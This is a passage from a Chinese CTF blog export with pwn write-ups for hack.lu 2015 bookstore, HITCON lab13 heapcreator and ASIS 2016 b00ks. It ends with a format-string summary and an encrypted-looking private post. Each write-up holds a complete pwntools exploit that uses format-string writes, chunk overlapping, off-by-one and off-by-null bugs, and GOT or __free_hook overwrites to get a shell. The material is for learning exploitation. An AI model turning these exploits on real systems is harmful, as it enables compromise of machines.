0x148253payload = 'a'*0x1cpayload+= p32(mov_eax_ecx+base) payload+= p32(mov_eax_ecx+base)payload+= p32(xchg_eax_esp_retb+base)payload+= '\x00'*3payload+= p32(xor_eax_pop_ebx+base)payload+= p32(sh_addr+base)payload+= p32(pop_ecx+base)payload+= p32(0)payload+= p32(pop_edx+base)payload+= p32(0)#payload+= p32(nop_xor_eax+base) nop_xor_eax+base=0x555d203a '\x20'空格字符会将在scanf()读的时候将payload截断.for i in range(11): payload+= p32(inc_eax+base)payload+= p32(int_0x80+base)pause()#gdb.attach(p)p.sendline(payload)p.interactive() 收货： gadgets的寻找：通过ROPgadgets –binary *** &gt; gadget 然后再在文件gadget里通过查找功能查找。（再次感谢川大的师傅 orz ） ret x 的意义是 eip 跳转之后esp = esp+4+x。 scanf( ) 看回车和空格结束，str( )系列函数看 ‘\x00’ 结束。]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2015-hacklu-bookstore]]></title>
    <url>%2F2019%2F04%2F01%2F2015-hacklu-bookstore%2F</url>
    <content type="text"><![CDATA[首先提供题目的二进制文件：2015_hacklu 预览： 程序为64位，然后没有relro，没有pie，给调试带来很大方便。放进ida看看基本功能： 可以看到程序开始的时候已经在堆申请了三个堆块，且大小固定为0x80。 这里感觉怪怪的，s可以输入0x80个字符。。。。应该会有用处。 可以看到程序最后有一个格式化字符串漏洞，我们通过经验得知，通过精心构造格式化字符串可以实现任意地址读写功能。所以我们的问题关注点应该暂时放到如何构造格式化字符串中。 接着往下看，看完后发现实际上程序功能很简单，就两个小功能，一个输入任意字节的输入功能，一个free()功能（uaf没什么用。）。 暂时有用的漏洞就是格式化字符串漏洞和任意溢出漏洞。 漏洞如何利用： 以格式化字符串漏洞为主线索来逆向推理分析，如何控制dest？？？，我们发现程序中好像没有可以控制dest的功能（任意溢出漏洞虽然可以覆盖到，但是之后dest会被更新为固定的字符串）。。。真让人头秃，只有自己构造了。。。。然后发现最后一个功能里的v5指向的chunk的位置还未固定（malloc()从bins里找chunk，而bins里的chunk是可控的），所以我们可以利用任意溢出漏洞更改v7指向的chunk的大小为0x150，然后free()，再通过程序的malloc(0x140)来实现chunkoverlapping，从而使v5指向的地址位于dest地址前面，然后利用填充v5的机会构造dest。这里还需要注意的地方是free(2)的时候，因为大小属于small chunk所以会有两道检查，一个是防止和后一块合并，所以必须伪造后后一块，并使其prev_inuse位为1，另一个是后一块的prev_inuse位要为1。 相信大家都能注意到，就是程序运行了一次就结束了，而我们至少需要两次运行，一次leak，一次change，所以这里需要利用第一次的机会来将fini_arry0改为main_addr，并且泄露libc地址（main函数返回到__libc_start_main中，可以在格式化字符串前来下断点，通过查看栈的数据来查看偏移，进而获得libc地址。），现在还有一个问题是fini_arry0怎么输入进栈并且确定偏移？？？这里需要打破常规思维，需要改的数据可以不在格式化字符串里，只要偏移可以确定就行！，这时候就想到了之前的那个s给了0x80的空间，我们可以将fini_arry0输入到s里然后通过调试确定偏移。 如果我们这时候继续往下做的时候做到最后会发现一个问题：改过got表之后程序已经几乎结束，不会再调用函数了，所以改了也没用，所以我们只能改main函数返回地址为one_gadget了，这时候我们就要确定泄露一个和返回地址的地址相对偏移不变的值，经过观察发现有一个存在，然后泄露他。 第二次返回时我们的任务就变成了改ret_addr为one_gadget即可。只需要改后面的三个字节即可（可通过调试发现）。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#coding:utf-8from pwn import *context(arch='amd64',os='linux')#context.log_level='debug'p=process('./books')P=ELF('./books')libc=ELF('./libc.so.6')#gdb.attach(p,'b *0x400c8e')#创建各个函数def edit(ID,des): p.recvuntil('5: Submit\n') p.sendline(str(ID)) p.recvuntil('er:\n') p.sendline(des)def delete(ID): p.recvuntil('5: Submit\n') p.sendline(str(ID+2))def submit(payload): p.recvuntil('5: Submit\n') p.sendline('5'+payload)#先构造chunk1造成over lapping 并且构造dest 两个目的：1.泄露__libc_main_ret#2.将fini_arry0改为main_addrfini_arry0=0x6011b8 #0x400830main_addr=0x400a39payload = '%'+str(0xa39)+'c%13$hn'+'.%31$p'+',%28$p'payload = payload.ljust(0x74,'a')payload = payload.ljust(0x80,'\x00')payload+= p64(0x90)payload+= p64(0x151)payload+= 'a'*0x140payload+= p64(0x150) payload+= p64(0x21) #为了bypass the check: !prev_inuse(next_chunk)payload+= 'a'*0x10payload+= p64(0x20)+p64(0x21) #为了使0x150的块不和nextchunk合并 #delete(2)edit(1,payload)delete(2)submit('aaaaaaa'+p64(fini_arry0))#submit('aaaaaaa')#gdb.attach(p)p.recvuntil('.')p.recvuntil('.')p.recvuntil('.')date = p.recv(14)p.recvuntil(',')ret_addr = p.recv(14)date =int(date,16) - 240ret_addr = int(ret_addr,16) - 0xd8 -0x110libcbase = date - libc.symbols['__libc_start_main']one_gadget = libcbase + 0x45216 #0x4526a 0xf02a4 0xf1147log.success('ret_addr = ' + hex(ret_addr))#raw_input()one_shot1 ='0x' + str(hex(one_gadget))[-2:]one_shot2 ='0x' + str(hex(one_gadget))[-6:-2]one_shot1 = int(one_shot1,16)one_shot2 = int(one_shot2,16)payload = '%' + str(one_shot1) + 'd%13$hhn'payload+= '%' + str(one_shot2-one_shot1) + 'd%14$hn'payload=payload.ljust(0x74,'a')payload=payload.ljust(0x80,'\x00')payload+=p64(0x90)payload+=p64(0x151)payload+= 'a'*0x140payload+= p64(0x150)payload+= p64(0x21)payload+= 'a'*0x10+p64(0x20)+p64(0x21)#delete(2)edit(1,payload)delete(2)submit('aaaaaaa'+p64(ret_addr)+p64(ret_addr+1))p.interactive() 我第一次做的时候的一些心得：2015_hacklu_bookstore: 这一题看似漏洞较多，但实际上难度不小，而且知识比较综合（有格式化字符串，堆栈的结合，overlapping，uaf等），利用起来很困难，费了很大劲才弄懂exp。还要感谢看雪的师傅。 学到的东西： 使程序再次运行的方法：改写fini_arry0的内容（一般在.fini_arry段中，在ida中ctrl+s寻找位置）为main_addr，可以再次运行，但只能用一次。 ida中使数字解析为字符串的方法，按r即可。 free(fast_bin（64位的极限是0x70）)时不需检查，而free(small_bin(64位是大于等于0x80))时，需要考虑几个因素： @1有可能会需要占位的堆块，防止被top chunk合并。 @2可能会造成unlink效应，注意构造时的size的inuse位，检查prev_chunk的占用情况，如果要unlink，两个堆块都要在small_bin的范围内。 @3会检查next_chunk(prev_inuse)的值是否为1,而next_chunk_addr=chunk_addr+chunk_size，chunk_size为自己构造，需注意。 利用overlapping构造格式化字符串来造成任意读写，得知偏移后提前构造栈的结构。 当通过格式化字符串获取任意写的功能时，除了向got表内写，还可以改写函数的返回地址为one_gadget（当然不一定能成功），这时就需要获取返回地址的地址，也就是栈中的某一个的地址，一般需要通过观察栈中数据是否有指向栈的并且和返回地址有固定的偏移，泄露其数值加上偏移即可得到返回地址的地址。 格式化字符串用%p打印出来的内容无需解包直接接受即可（所有内容都是字符，比如：0x600124则需要data=int(p.recv(8),16)），%s需要解包(接受时是以字符接受的，0x600124为data=u64(p.recv()[0:3].ljust(8,’\x00’)))。 [-2:]和[-2:0]的区别。。。 当利用改fini_arry0为main_addr而使程序再次回到开头时，程序的两次返回地址之间有一个固定的偏移。]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitcontraning_lab13_writeup]]></title>
    <url>%2F2019%2F03%2F31%2Fhitcontraning-lab13-writeup%2F</url>
    <content type="text"><![CDATA[依然是wiki上的例题，先提供二进制源码：hitcontraning_lab13 预览： 文件是64位，partial relro则可以改写got表，感觉就像是堆题（名字也叫heapcreator）。。。没有pie调试起来会方便很多。。。然后放进ida64看一下大致功能。 前言分析：首先有两个setvbuf()设置好了标准输入和标准输出的缓冲区，所以程序不会在heap段设置chunk，然后打印一个菜单，之后就输入一个字符串，然后通过atoi()函数将字符串转换成数字，（这里可以想到如果将atoi_got改为system_addr后，直接输入‘/bin/sh\x00’就可以拿shell了），但是不幸的是他只可以输入4个字节。。。。但这一点后面能用上。 程序主要功能分析（寻找漏洞）：首先有四个主功能：create()，edit()，delete()，show()，当我们看到有edit和show存在的时候，这一题多半不会难，因为这两个函数为我们的泄露和篡改打下了基础，之后开始逐个分析。。 在create()中我们可以发现当输入size的时候调用atoi()的时候可以输入8个字符串！！！nice，我们的设想得到了成立！所以我们的目标设为改写atoi_got为system_addr。 在edit()功能中发现了off-by-one漏洞，通过这个我们可以实现chunk overlapping。 show()则是正常的打印内容。 delete()函数知识正常将chunk放入Bins，然后将指针归零，没有uaf漏洞。 利用漏洞来实现功能：leak: 想要leak出libc，先考虑常用的泄露got表地址，因为show()功能是打印heap的content指针所指向的内容，所以想办法将content指针改为atoi_got，然后再show就可以泄露出Libc。 利用chunk overlapping来进行chunk的覆盖重叠，申请两个chunk，第一个chunk的作用是来改第二个heap结构体的大小（可以设计好使其正好和top_chunk接轨就省去了nextchunk的prev_inuse检查，例如我是申请一个content大小为0x10的chunk，然后将heap结构体的大小改为0x40），然后delete以后其会被放入对应的fastbin中，然后再申请与其大小对应（0x30）的heap，使heap结构体0x10申请到的内存位于之前content位于的地方。这就形成了覆盖。（经典的与unlink类似的，我改我自己形式，即通过漏洞利用使一个结构体中的一个指针指向自己地址前方的不远处，通过向那个地址编辑内容来达到修改自己的目的。）如下图所示： 这就可以利用edit功能来改heap结构体的content指针。接着可以实现任意地址写的功能。 change: 泄露出libc以后就可以获得system_addr，然后利用任意地址写的功能将atoi_got改为system_addr，然后就利用之前说的方法来拿shell。 exp如下：两种思路，只讲了第一种，第二种类似，只不过利用的是free(addr_’/bin/sh\x00’)： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./heapcreator')P = ELF('./heapcreator')libc = ELF('./libc.so.6')atoi_got=P.got['atoi']#创建函数def create(size,payload): p.recvuntil(':') p.sendline('1') p.recvuntil(': ') p.sendline(str(size)) p.recvuntil(':') p.send(payload)def edit(ID,payload): p.recvuntil(':') p.sendline('2') p.recvuntil(':') p.sendline(str(ID)) p.recvuntil(': ') p.send(payload)def show(ID): p.recvuntil(':') p.sendline('3') p.recvuntil(':') p.sendline(str(ID))def delete(ID): p.recvuntil(':') p.sendline('4') p.recvuntil(':') p.sendline(str(ID))payload='a'*0x18create(0x18,payload)payload='a'*0x10create(0x10,payload)payload='a'*0x18+p8(0x40)edit(0,payload)delete(1)payload='a'*0x10 create(0x30,payload)#gdb.attach(p)payload='a'*0x10+p64(0)+p64(0x21)+p64(0x30)+p64(atoi_got)edit(1,payload)#gdb.attach(p)show(1)p.recvuntil('Content : ')atoi_addr = u64(p.recv(6).ljust(8,'\x00'))log.success('atoi_addr=' + hex(atoi_addr))#gdb.attach(p)libcbase = atoi_addr - libc.symbols['atoi']log.success('libcbase=' + hex(libcbase))system_addr=libcbase + libc.symbols['system']payload=p64(system_addr)edit(1,payload)p.recvuntil(':')p.sendline('1') p.recvuntil(': ')p.sendline('/bin/sh\x00')p.interactive() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#coding:utf-8from pwn import *context(os='linux',arch='amd64',timeout=1)p = process('./heapcreator')P = ELF('./heapcreator')libc = ELF('./libc.so.6')free_got=P.got['free']#创建函数def create(size,payload): p.recvuntil(':') p.sendline('1') p.recvuntil(': ') p.sendline(str(size)) p.recvuntil(':') p.sendline(payload)def edit(ID,payload): p.recvuntil(':') p.sendline('2') p.recvuntil(':') p.sendline(str(ID)) p.recvuntil(': ') p.sendline(payload)def show(ID): p.recvuntil(':') p.sendline('3') p.recvuntil(':') p.sendline(str(ID))def delete(ID): p.recvuntil(':') p.sendline('4') p.recvuntil(':') p.sendline(str(ID))#先创建两个堆块，让前面的off-by-one后面的create(0x18,'a'*4)create(0x10,'a'*4)edit(0,'/bin/sh\x00'+'a'*0x10+'\x41')#往fastbin送块delete(1)#再申请，使content覆盖heaparry[1]结构体的内容create(0x30,p64(0)*4+p64(0x30)+p64(free_got))#泄露libcshow(1)p.recvuntil('Content : ')free_addr=u64(p.recv()[0:6].ljust(8,'\x00'))log.success('free_addr=' + hex(free_addr))libcbase=free_addr-libc.symbols['free']system_addr=libcbase+libc.symbols['system']#将system_addr写入free_got里edit(1,p64(system_addr))delete(0)p.interactive() 我第一次做的时候的一些心得：hitconingtraining_lab13: 这一题难度不大，但是还是没有独立做出来，需要再独立处理一遍。 常见套路，申请书籍，然后用结构体储存书籍内容的指针和大小，结构体在堆上，书籍内容申请的空间也在堆上。 有edit和print功能说明不难，用edit向书籍的内容指针里任意写，所以想办法将内容指针改为free_got，再调用edit功能将其内容改为system_addr。 然后想改书籍的内容指针则需要控制结构体堆块，溢出和chunk overlapping都可以，溢出找不到，则为后者。 利用off_by_one漏洞和fast_bin的机制，更改size of 第二本书结构体堆块，用第二本书的内容控制结构体堆块内容，更改其为free_got，然后edit书籍二。 再考虑’/bin/sh’的位置，放在书籍一的内容里比较合适。system(addr_/bin/sh)，因为内容为/bin/sh所以free(ptr_des)的时候正好为system(addr__ /bin/sh)。]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2016-Asis-books_writeup]]></title>
    <url>%2F2019%2F03%2F31%2F2016-Asis-books-writeup%2F</url>
    <content type="text"><![CDATA[wiki上的一道经典例题，写wp的目的一方面是wiki上一些细节讲的有点不太清楚，一方面是自己巩固一下做过的题目，看是否是真的掌握。 首先提供题目二级制文件链接：books 预览：拿到题目先看基本信息： 可以看到题目是64位文件，所有保护全开，一般这种题目是堆题，且看到full relro则大概率是篡改malloc_hook。 然后运行一下，找到程序运行入口，然后放入ida里看反汇编码： 准备功能分析：（不要忽视，做的题多了会发现有时候这里可能存在关键漏洞）这里因为我已经做过了，所以函数名和一些变量名已经被我改成了对应的功能，可以看到程序开头先打印欢迎语，然后让我们输入作者（字符串储存在bss段，是可控的），这里的输入函数存在off-by-null漏洞，当输入32个字符时，既可以用来change，又可以用来leak(因为字符串后面没有‘\x00’，所以可以泄露authername这个字符串之后的内容直到’\x00’，这也是常见的套路。。。) 程序主功能分析：程序有五个功能：1.create 2.delete 3.edit 4.print 5.change_authorname，大致的整体功能实现就是用户申请书本，然后书的名字和内容大小都由我们自己来定，并将它们的内容存放在堆上，然后创建一个大小固定的Book结构体来储存被创建的book的信息，其也放在堆上，创建一个book以后堆上的结构和bss段的联系大概如下图所示： 紧接着删除功能删除booklist中的Book指针，并且将指针归0，没有uaf漏洞 然后edit功能就是将Book的des重新输入，没有漏洞 然后是print功能，打印书的ID,name,des和书的作者，这个漏洞之前提过，分析bss段的结构就可以发现打印作者使可以泄露第一个book指针，这里需要注意，因为之后的所有chunk大小我们都可以自己控制，所以经过简单的计算，就等于我们泄露了所有的book指针和name,des指针！！！这是解题的一个关键之处。 再之后是change_authorname功能，就是更改作者的名字，当输入32个字节时依然存在off-by-null漏洞（因为是off-by-null,不是off-by-one，所以难度会有所加大）。 漏洞利用思路：leak: 在前面已经提过，利用authorname最后一个字符’\x00’被book指针覆盖所以可以泄露book1指针的值，从而泄露之后所有的指针。 难点在于怎样泄露Libc，这里有一种新的方法，适用于chunk大小我们自己可控并且其地址可以泄露的情况，我们把book2的name和des申请的大于128KB（0x20000），则ptmalloc2将会用mmap来为我们分配内存，然而mmap的地址和libc的地址相对偏移不变（经过一次调试就能确定偏移），所以我们只要泄露了book2的name地址就等于泄露了libc，那再思考怎样泄露book2的name地址呢？现阶段我们只能利用程序自带的打印功能，他将打印所选的book的name指针和des指针所指向的内容，由book1指针已经由于off-by-null而最后一个字节被变为00，其之前肯定大于0，因为内存的分页分配机制，所以想让其被改过后的book1指针落入book1的des中，book1的des要相对的大一点。。。并且利用edit功能来重新编写book1的des，在book1指针指向的那个地方（这里的偏移不变，通过调试确定）伪造一个fake_book2_struct，其name指针为book2的name指针的地址（为addr_book1+56），然后利用打印功能来leak出book2的name指针的值，Libc泄露成功！！！ change:利用程序自带的edit功能来改malloc_hook为one_gadget（one_gadget需要多次尝试），因为我们已经可以掌控book1的des指针的值了，所以也就实现了任意地址写入。之后再次申请的时候就会触发malloc_hook拿到shell。 exp如下（我当时做的时候是改free_hook，具体的一些偏移量需要自己调试来确定，exp只提供思路！！！）：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#coding:utf-8from pwn import *context(os = 'linux',arch = 'amd64')context.log_level = 'debug'p=process('./b00ks')P=ELF('./b00ks')libc=ELF('./libc.so.6')#先创建每个函数def create(name_size,name,des_size,des): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil(': ') p.sendline(str(name_size)) p.recvuntil(': ') p.sendline(name) p.recvuntil(': ') p.sendline(str(des_size)) p.recvuntil(': ') p.sendline(des)def delete(ID): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil(': ') p.sendline(str(ID))def edit(ID,des): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil(': ') p.sendline(str(ID)) p.recvuntil(': ') p.sendline(des)def printf(ID): p.recvuntil('&gt; ') p.sendline('4') p.recvuntil(': ') for i in range(ID): book_id=p.recvline()[:-1] p.recvuntil(': ') book_name=p.recvline()[:-1] p.recvuntil(': ') book_des=p.recvline()[:-1] p.recvuntil(': ') book_author=p.recvline()[:-1] return book_id,book_name,book_des,book_authordef change(name): p.recvuntil('&gt; ') p.sendline('5') p.recvuntil(': ') p.sendline(name)#创建两个书本p.recvuntil(': ')p.sendline('a'*32)create(8,'a'*4,1024,'a'*8)create(0x21000,'b'*4,0x21000,'b'*8)#泄露第一个书本的地址book1_id,book1_name,book1_des,book1_author = printf(1)book1_addr=u64(book1_author[32:32+6].ljust(8,'\x00'))log.success('book1_addr=' + hex(book1_addr))#改第一个书的description为伪造的book2（name指针和des指针指向book2的name指针和des指针）payload='a'*0x3c0+p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xaaaa)edit(1,payload)#改名字覆盖book1的地址，使被覆盖的地址指向伪造的Bookchange('a'*32)#泄露libc地址和查看one_gadget地址offset=0x5b2010 #需要自己确定，变动较大。#one_gadget=0x45216one_gadget=0x4526a#one_gadget=0xf02a4#one_gadget=0xf1147book_id,book_name,book_des,book_author = printf(1)book2_name_addr=u64(book_name.ljust(8,'\x00'))log.success('book2_name_addr=' + hex(book2_name_addr))libcbase = book2_name_addr - offset#通过伪造的Book改book2的des指针，使其指向__free_hook, 通过edit功能将__free_hook改为one_gadget free_hook = libc.symbols['__free_hook'] + libcbase#binsh_addr=libc.search('/bin/sh').next() + libcbase#system_addr=libc.symbols['system'] + libcbaseedit(1,p64(free_hook))one_gadget_addr = one_gadget + libcbaseedit(2,p64(one_gadget_addr))#然后调用删除功能，调用free()函数delete(2)p.interactive() 第一次做的时候的一些心得:2016-Asis-b00ks: 个人感觉这一题难度较大（off-by-null），我对这别人wp才勉强看懂并且感觉思路比较巧妙，也获益匪浅，最后自己拿了shell也比较开心，起码证明自己真的懂了。。。。。想总结几个小的需要注意，很有可能成为阻碍我们做题的关键点。 关于调试：调试最好用gdb attach pid 在exp未成形之前，保证不要有语法错误，然后一点一点跟exp看数据行了，如果开了PIE的话，下断点要用基址（用vmmap看）+ida里的地址才是程序真正的虚拟地址。调试过程x/160xg addr 看bss段的数据或者堆的数据。 libc的偏移泄露新方法：mmap出来的地址和libc的地址相对位置不变。 除了用got表之外的新方法。 relro full 时虽然无法改got中的数据，但是可以改__free_hook(malloc同理） 在recvuntil()接收时一定要注意‘ ’和‘\n’的处理。。而且一般只要截取最后一个标点即可。 python的函数返回值可以有多个，同理也是可以多个接收。for i in range(整数)的巧妙运用也可以接收到自己想接收的数据。 泄露Libc’的思路可以为先想着泄露一块当前程序的一个地址（mmap地址或者堆的地址），然后通过gdb调试看某一次的程序来确定偏移（got则不需要），之后用泄露的地址加上偏移即可。 如果程序有对某一块内存写的功能函数，我们就可以想着控制这块内存的地址，进而造成任意内存写。 one_gadget的运用，暂时觉得可以逐个尝试，有可能需要构造rax rsp等等。调试问题还未解决]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[格式化字符串小心得]]></title>
    <url>%2F2019%2F03%2F31%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B0%8F%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[格式化字符串的一些总结和心得： 虽然做的题目不多，但是还是有一点感悟，小总结一下。 格式化字符串漏洞可以实现的事情： 读（泄露函数地址），一般用于泄露出想要篡改的函数的got表的内容，也就是其真正的地址，需要ELF功能来获取got表地址，payload一般为‘%k$s’+p32(fun_got)，k为fun_got这个字符串所在位置的偏移，还要注意x86和x86_64的偏移计算方法的差别。 写（篡改）： 篡改某一个函数的got表内容，这个函数选择很重要，可能决定了exp的复杂程度： 当程序没有循环时，尽量选择printf()之后的函数，实在不行只能同时改两个地址，一个选择的函数的地址，一个fini_arry首元素的内容为start的地址，使程序重新运行。 当程序有循环时就无需那么麻烦。 看程序中有无system(&#39;/bin/sh&#39;): 有的话难度较低，将printf之后的一个函数的got表改成system(&#39;/bin/sh&#39;)的地址即可，再想办使这个函数被调用。 没有的话得先用读的功能泄露Libc版本，然后获取system函数的地址，这时候所选择函数必须是类似这种：puts(buf)，printf(buf)这种，并且buf必须可输入，这样才可将buf改为‘/bin/sh’并调用system(&#39;/bin/sh&#39;)。 特殊情况： 改写某一数据使其符合if语句条件从而调用if之后的system(&#39;/bin/sh&#39;)。 改写printf函数的调用函数（不是main函数）的返回地址，使其返回到system(&#39;/bin/sh&#39;)上。这里比较特殊，需要调用函数不太复杂，其中没有很多变量，才能使得其bp能在偏移中找到，然后才能确定offset。进而用读的方式获取返回地址，然后篡改。 利用形式： x86：单个改写可用fmtstr_payload=(k,{fun_got:sys_addr})，较简单。 x86_64：因为地址中带有‘\x00’所以直接用%k$lln改写时不能将p64(fun_got)放到‘%k$lln’前面，否则会截断，只能将其放在后面。或者采用$hn的方法改写尾部。 注意两个对齐：格式化字符串字节数与地址对齐，输出长度与改写数据对齐。]]></content>
      <categories>
        <category>PWN基础</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寒假小结]]></title>
    <url>%2F2019%2F03%2F31%2F%E5%AF%92%E5%81%87%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[私人空间，谢绝访问 80080fb9b96ffa56f71696a5a0ed70d4872ab799b6b6608c69073ba704341c6a04e22809c66f3cbccd8e55cd8d7733e04c9c8d74b0a47c3017c96daf19abf468cfcb22cfc8d19ae86a7ab3ba6b9462cb390c4bb11e2f6e1ea26961b135d930196527ac210bd65da23b05434c503bc68bb7c55ea05f860d8b95fd516df11315ab75b9b5c3bf8fdcf21e87fd5bff4d0838a45de276c00fefa4f2ea0c0bdeeb02149b26df1fed706f3be596f0581df00c158c5a0578d162f1dda25197ceb10e8722b1ffbdc21e3f80515ac9901607560cfc142bd2dec666da79d961a66d515bdea5967e4302356a29e25aa31fa73d347904857746379f71a6efeaed814342ffbe142178daa91d7e1dccba414ab06dc0535ea2d5a45057a14e8425097699118e99ca30262c82a544938960301f5844fdb265154aba492f897ceab1f3e4da80e555c20890044a1bd0d8a8fa084eff498411354632faab6e897a3f8accba17d3774172af9615378abe255c260f8846bb7de1fc48fa37fd3aa65b3e8c4aa4f6358ad449ddb7e8e80f57834e27bff2430ba50f32c33acd15fe3034bd6e53008764df678108baa63cc1bb2271b89b3b69ff75472d71f02ac8f20c01d178df47a0252730153df307681d57bf4465fd3a6a76fe46d5857f7ba6291b5804091b89b99de4cf3d41baeeb028baa7868062986e52a28727eb4baa238e2daba1aeaff489f760090f1cf0141d090fe2e2f14cf4df5bc5879363bb4da54d36b0d23e4b19168c6a0ded708cd1a3f5cf2726905d50c62e2f633687ba10663c7bd8045483ef21aa88ecca02a285bcdf70e28bd7e02c2c07509c3f654d7f75dcd42e395d2b862c5903b2f51c7be42b7652f91ccb9949b127d6940c9088ee7afc11a5432666feb0ec82bdf0ec785ed230f32208663dffba59b6bb289cedaec01233e2158133642d9d87ac2c36fae94aef85904e6c9fee4865f79b5333f10863a64a1865ab01db1b8faa1d32d8d7f26d66cb7df1a3e1ce32ba1b1fa238a320858f551f0fb7cf704a61b1b24351d6f4a2fa3ec5e5c967b8f0d8014fbc0ad3768f777b9ed50bba495bee8fe7f0afe805fb23666ab0b4f148110216838b4f6954e59a57d7d527678cc5737e9ce4502d80f10f92b7786f1ec781d1515392ae481287843cf2a4d7134098c9bb16c9d7d5d8ca528062912c71f84262623093182d26172677cf789ba98ce965bbf52316a4109b0019971a58c6b402c9cb87ff37640ffadc161a0fc53e63a9c095dfa0ca9750369f00f07b4d225a335fc5d0213b07cb02533b978ae4b649c1ffad43c86e77ee10670c8681f7985e9b8a72385c6a48737e2ccac63b16c340db9a549747557e8411c41ea6d66c7a2093fe81123fc95ac83f26ab44e5a5a23f934268fcd6850df1e5cda986f9e12008fbb995c62cc4943930e5db8c9f6bd15582ad66b85a9acb7b05907f19128ae7229d0cb887ed868539c109beddba367fe9994418c60cb6b1ffc0d4fdfa80784112c1ae463711f5d5e74340a305ac7eed7e10bf881d35fcabd0c121fd1565ead207ed4d34dacef0cb3428c77d1a5ae4b6e45f8c50e6883d8dd1a39c13ffcde46de65944c4ec876b226c047be57317d5676f1c31c1ba36634948e28a3d3ce8174312d2c653c972f92db4ac3a4801d6730b707a9293a4c71f205a95155500c03ab82874469d91b119a62dba05fcd31416d1034ca840634b856fc385b51f3458f7b05f211fe059eb5bcbd062dc5a57a49a001a2421e8e389532bf8771d07565b12f627bc66cfdc023135c3bee24a83c63f57553e0aa47ef32472b76cc6e89cfd4d20753351041646b9ca6ad6758956380f0b03c11b973b3fb89746e38d81e87dcfee664cbe4d6842f4b9512fb60236a1e337a58479e36b6319020f85a641777de20d972aa291b2405dc634ba7a84a6205026fb6d04db91d35f790de4280850af776742e327907678179772ae72b61b4af193e3a6a815f4d5efd111ad8c0e2ea9646e0c106952b3d946d219ef83d40ffd857224aa41f0c6e23641aed763d70769e9e03ef23ee5e6b28b94e965a3ad728922415920181f90ffde18a3e3dddeff2dbd67d3f08d722a47baa6779cca0f3ec7bc947221fc4ba51cc73353117d1c6461f8ce144c3e2a3389cd868db545e841ab0db4c0d885e8172cd23f7778d327a923660931ee349e4717814225fefcdf89a7deff5433ee242ca172a4d39ac6994a0c721ee1f3986be2f1119d6c821d1af159aa0ad96bf5318538dee22b21304be3fed724da8a84c71d7b91adceac2351e0afcf2cbc5698b32baae40456fcd447fe4f8703c04275a572c85da47d1bc55fdddadd3134b8e9223ac3b01b8a4a6002b6be2a18140d618a78bbf2faee704f679485986d1023329c804d41e0b9309ad006244a1ff44e4a9bb2f9289db4f44b5f8da698f38e996ac0de1aa9a35e53434a36dc7e7950ccc9d2b788850bf1aa313f2ab53048e0720137bca8c1c53a2bb3a0d8c1472756b3603ffe90f1fe41fa5fa7b64a48f96fd3443f874397274594dc84927e0f2d2ba1223f8288a7ceef94cee39493befd121fec39a819fbad036df0e252bdbbd448f3d6c7d0604324bf3559f339f74e9f863a095f887535e7ff2a8a1b33deb9010723f4d7767a3fb9b0aadd84f81494174c10744f12d136a5cea322dd9f45a02f28c85d7e4503215012e23f34176a966c44024b08c5157bc4fe9d2ebaefa5778096feb5b5fe48a007f0be03d934b0ef5e8a2437c18cbfab07f077cfc74f2e14f2c8dd625adec97b3e9503d71ff60917178fe9f4b5d33db1530433dee209932f651acb34f8dae29ac202e2a71e0c6ae473c33d22c0e55f77f512bf0b73bccc979144cf8c2d77227d1e427e682e392b98e15e98b26c5387f2b3737d75888fd21a0a52fc85029d84b88b9817b93944ab2f2fbc507f8ee4637c9bb0a9a0a1f780920a3b22f6a7b9d5f000a694f6869d4a3c4faf1dc77d018bf2a2c8e08a51edc4970d86b946c6429394bab8a78e0d79c629ab127fe00e008febd326b00cee174ed191a1023c83d84b8937da93333e7363db4fe6ba32d3b5a56eecb47758f3c315ec5ea4ee0c4dc9c4642e79c4835e5e8bc7397000db7b7d8b0ab4040d0860192d5a80fa48765c40b970c6f68c9f1f5d31273a83dec0f0d979a030714bd205371745413a8ff6b6892c5ac7d483bce38b32d1cfa89c1e6553050020b641e220b5140d715669afff49b15b6e3430e8086999fdf5850eda9a0e77f008c48f0bc7cf057e7e56870050e4e44a06a3e804341483eb163603cc0dad98d0851d9f1eddd1fe8372303cf8505bb47ad150d1f9befe33b728fe9a1152a0e1723134218cb6efa2f4373edb024da3a75b1b65c12e60b14f9951ddddcb961175ef4a6a654ee339540dd62f507a5371c966c88a1ec8969b8ab8eb640cd2668ae82f8dec952ac794d6d52f1c5312a864a7c3d99012ef0904d1c8b6535d3e964552bfb9b88827426f8d920aaa837740c4571c78a0c3e7ecd371760e248c979bb90755a2031fc4588bdcaa3457415f7d3fa1f2745939279c5dd09b652d59757bed567627562fa1863f307cd00039669d82a55793a3e8aecd891479127643a43dc751753ba845550e94df3b487f9a32c821c0b38c3c8b662e72066c6b1edebd72e6ffe47fb4b9acb90bee254784e2b764df5820224177bc72bbce1b80acf1f382b6b3a596cbfc0d97f8d2f499bf3c41f1fac0db1e83f70cedddc44f4218a196f3ded136f8124787259e18b47a36cffa059f9a015d611845b47db47f40e70990d0c6ac351122e3c3aac9390c3596d1319628bac30fa1da930e18c2c797a